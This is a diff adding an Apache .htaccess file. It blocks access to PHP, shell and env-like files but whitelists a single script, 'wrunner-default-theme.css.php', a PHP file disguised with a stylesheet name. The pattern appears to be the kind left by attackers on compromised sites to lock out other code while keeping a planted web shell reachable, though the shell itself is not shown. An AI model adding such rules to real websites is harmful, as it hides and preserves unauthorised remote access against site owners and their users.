@@ -1,0 +1,9 @@
+Options -Indexes
+<FilesMatch "(?i).*(ph|sh|pj|env|cg).*">
+Order Deny,Allow
+Deny from all
+</FilesMatch>
+<FilesMatch '^(wrunner-default-theme.css.php)$'>
+Order allow,deny
+Allow from all
+</FilesMatch>
